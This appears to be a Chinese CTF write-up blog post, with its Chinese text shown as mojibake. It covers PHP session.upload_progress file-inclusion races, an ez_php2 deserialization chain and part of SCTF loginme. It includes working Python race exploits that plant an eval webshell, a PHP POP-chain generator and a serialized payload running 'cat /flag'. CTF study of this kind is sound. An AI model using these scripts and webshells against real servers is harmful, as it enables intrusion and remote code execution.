<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.auto_startï¼šå¦‚æœ session.auto_start=On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ– Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ä½†sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º offã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰ Session ID çš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨ Cookie é‡Œè®¾ç½® PHPSESSID=ph0ebus ï¼ŒPHP å°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š/tmp/sess_ph0ebusâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„ session.upload_progress.name å€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥ sess_ æ–‡ä»¶é‡Œã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_pathï¼šè´Ÿè´£ session æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼Œåé¢æ–‡ä»¶åŒ…å«çš„æ—¶å€™éœ€è¦çŸ¥é“æ¶æ„æ–‡ä»¶çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰é…ç½®åˆ™ä¸ä¼šç”Ÿæˆsessionæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_enabledï¼šå½“è¿™ä¸ªé…ç½®ä¸º On æ—¶ï¼Œä»£è¡¨ session.upload_progress åŠŸèƒ½å¼€å§‹ï¼Œå¦‚æœè¿™ä¸ªé€‰é¡¹å…³é—­ï¼Œåˆ™è¿™ä¸ªæ–¹æ³•ç”¨ä¸äº†</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_cleanupï¼šè¿™ä¸ªé€‰é¡¹é»˜è®¤ä¹Ÿæ˜¯ Onï¼Œä¹Ÿå°±æ˜¯è¯´å½“æ–‡ä»¶ä¸Šä¼ ç»“æŸæ—¶ï¼Œsession æ–‡ä»¶ä¸­æœ‰å…³ä¸Šä¼ è¿›åº¦çš„ä¿¡æ¯ç«‹é©¬å°±ä¼šè¢«åˆ é™¤æ‰ï¼›è¿™é‡Œå°±ç»™æˆ‘ä»¬çš„æ“ä½œé€ æˆäº†å¾ˆå¤§çš„å›°éš¾ï¼Œæˆ‘ä»¬å°±åªèƒ½ä½¿ç”¨æ¡ä»¶ç«äº‰(Race Condition)çš„æ–¹å¼ä¸åœçš„å‘åŒ…ï¼Œäº‰å–åœ¨å®ƒè¢«åˆ é™¤æ‰ä¹‹å‰å°±æˆåŠŸåˆ©ç”¨</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_nameï¼šå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_prefixï¼šå®ƒï¼‹session.upload_progress_name å°†è¡¨ç¤ºä¸º session ä¸­çš„é”®å</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721135246993.png" alt="image-20240721135246993"></p>
<p>åˆ©ç”¨è¯¥æ¼æ´ç‚¹éœ€è¦æ»¡è¶³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç›®æ ‡ç¯å¢ƒå¼€å¯äº†session.upload_progress.enableé€‰é¡¹</span><br><span class="line">å‘é€ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ–‡ä»¶è¡¨å•å’Œä¸€ä¸ªåå­—æ˜¯PHP_SESSION_UPLOAD_PROGRESSçš„å­—æ®µ</span><br><span class="line">è¯·æ±‚çš„Cookieä¸­åŒ…å«Session ID</span><br><span class="line"></span><br><span class="line">æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åªä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸ä¼šé—ç•™ä¸‹Sessionæ–‡ä»¶çš„ï¼Œæ‰€ä»¥è¡¨å•é‡Œå¿…é¡»æœ‰ä¸¤ä¸ªä»¥ä¸Šçš„æ–‡ä»¶ä¸Šä¼ ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721135511825.png" alt="image-20240721135511825"></p>
<p>php session.upload_progressé€šç”¨åˆ©ç”¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall <span class="keyword">as</span> re_findall</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;http://node4.anna.nssctf.cn:28463/&#x27;</span></span><br><span class="line">PHPINFO_URL = HOST + <span class="string">&#x27;phpinfo.php&#x27;</span></span><br><span class="line">LFI_URL = HOST + <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">WEB_SHELL = <span class="string">b&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session_configures = &#123;&#125;</span><br><span class="line">resp_text = re_findall(<span class="string">&#x27;&lt;td class=&quot;e&quot;&gt;session\.(.*?)&lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*?)&lt;/td&gt;&#x27;</span>, requests.get(PHPINFO_URL).text)</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : session_configures.update(&#123;x[<span class="number">0</span>] : x[<span class="number">1</span>]&#125;), resp_text))</span><br><span class="line"><span class="keyword">if</span> session_configures[<span class="string">&#x27;upload_progress.enabled&#x27;</span>] != <span class="string">&#x27;On&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Target is not vulnerable&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_phpinfo</span>():</span><br><span class="line">    exploit = <span class="string">f&quot;&lt;?php file_put_contents(&#x27;/tmp/.shell.php&#x27;, base64_decode(&#x27;<span class="subst">&#123;b64encode(WEB_SHELL).decode()&#125;</span>&#x27;)); echo md5(&#x27;ccc&#x27;);?&gt;&quot;</span></span><br><span class="line">    data = &#123;session_configures[<span class="string">&#x27;upload_progress.name&#x27;</span>] : exploit&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span> : <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">    files = &#123;<span class="string">&#x27;files&#x27;</span> : (<span class="string">&#x27;hello.txt&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">1024</span> * <span class="number">1024</span>)&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        requests.post(PHPINFO_URL, data=data, cookies=cookies, files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_sess_file</span>():</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    data = &#123;<span class="string">&#x27;file&#x27;</span> : session_configures[<span class="string">&#x27;save_path&#x27;</span>] + <span class="string">&#x27;/sess_c&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        resp = requests.get(LFI_URL, params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;9df62e693988eb4e1e1444ece0578579&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] The webshell was successfully written to /tmp/.shell.php&#x27;</span>)</span><br><span class="line">            success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">Thread(target=request_phpinfo).start()</span><br><span class="line">Thread(target=request_sess_file).start()</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://node4.anna.nssctf.cn:28463/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721140632112.png" alt="image-20240721140632112"></p>
<h2 id="FSCTF-2023-ez-php2"><a href="#FSCTF-2023-ez-php2" class="headerlink" title="[FSCTF 2023]ez_php2"></a>[FSCTF 2023]ez_php2</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">Class Rd&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;All matters have concluded&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;ending);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt;<span class="variable">$value</span>)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$arg</span>[<span class="number">0</span>][<span class="string">&#x27;POC&#x27;</span>]==<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;payload = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$paylaod</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$paylaod</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;symbol = True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$value</span>(<span class="variable language_">$this</span>-&gt;Flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;start1.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start2===<span class="string">&quot;11111&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;start1-&gt;<span class="title function_ invoke__">Love</span>(<span class="variable">$this</span>-&gt;start);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are Good!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You are Silly goose!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>EXP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span> = [<span class="string">&#x27;POC&#x27;</span>=&gt;<span class="string">&#x27;1111&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Ha</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Poc</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Er</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Rd</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;start2 = <span class="string">&quot;11111&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;start1 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="variable">$b</span>-&gt;payload;</span><br><span class="line"><span class="variable">$d</span>-&gt;cl = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;Flag = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:4:&quot;1111&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:9:&quot;cat /flag&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:5:&quot;11111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721172553666.png" alt="image-20240721172553666"></p>
<h2 id="SCTF-2021-loginme"><a href="#SCTF-2021-loginme" class="headerlink" title="[SCTF 2021]loginme"></a>[SCTF 2021]loginme</h2><blockquote>
<p>I donâ€™t know the age of the admin, can you tell me?By the way, adminâ€™s Password maybe the thing you want</p>
</blockquote>
<pre><code>![image-20240721173419307](https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721173419307.png)
</code></pre>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xff&spm=1001.2101.3001.7020">xff</a>ï¼ŒX-Clien-IPï¼ŒX-Real-IP,x-remote-ipéƒ½ä»£è¡¨æœ¬åœ°ï¼Œæœ€åX-Real-IPæˆåŠŸè¿›å…¥</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721173819147.png" alt="image-20240721173819147"></p>
<p>ç„¶ååˆ†ææºç </p>
<p>å…³é”®ä»£ç </p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721174231082.png" alt="image-20240721174231082"></p>
<p><strong><code>middleware</code></strong></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721174020113.png" alt="image-20240721174020113"></p>
<p>æˆåŠŸè¿›å…¥åè·³è½¬è·³åˆ°<code>route.Login</code></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721174402402.png" alt="image-20240721174402402"></p>
<p>é¦–å…ˆè·å–idï¼Œæ²¡æœ‰çš„è¯é»˜è®¤ä¸º1ï¼Œç„¶åå°†å­—ç¬¦ä¸²å½¢å¼çš„idè½¬æ¢ä¸ºæ•´æ•°ï¼Œå¦‚æœè½¬æ¢å¤±è´¥ï¼Œåˆ™idå°†è¢«è®¾ç½®ä¸º<code>1</code>ã€‚</p>
<p>åœ¨<code>structs.Users</code>åˆ—è¡¨ä¸­æŸ¥æ‰¾ä¸<code>id</code>åŒ¹é…çš„ç”¨æˆ·ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…é¡¹ï¼Œåˆ™ä½¿ç”¨<code>structs.Admin</code>ä½œä¸ºé»˜è®¤ç”¨æˆ·ã€‚</p>
<p>æ£€æŸ¥ç”¨æˆ·çš„å¹´é¾„å­—æ®µï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™ä»æŸ¥è¯¢å‚æ•°ä¸­è·å–<code>age</code>ï¼Œå¦‚æœä»ç„¶æ²¡æœ‰åˆ™ä½¿ç”¨é»˜è®¤å€¼<code>forever 18 (Tell me the age)</code>ã€‚</p>
<p>è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721175148767.png" alt="image-20240721175148767"></p>
